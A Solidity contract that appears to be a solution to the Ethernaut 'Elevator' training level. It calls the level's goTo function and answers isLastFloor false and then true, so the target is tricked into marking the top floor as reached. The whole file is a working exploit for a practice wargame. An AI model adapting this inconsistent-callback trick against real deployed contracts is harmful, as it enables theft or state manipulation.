// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface ElevatorEthernaut {
    function goTo(uint256 _floor) external;
}

contract Elevator {
    ElevatorEthernaut public en;
    bool isTop = false;

    constructor() {
        en = ElevatorEthernaut(
            address(0x3Fe9fcd68E89F585Ce9E7593c0De932077FB7490)
        );
    }

    function tryit() public {
        en.goTo(5);
    }

    function isLastFloor(uint) external returns (bool) {
        if (isTop) {
            return true;
        }
        isTop = true;
        return false;
    }
}
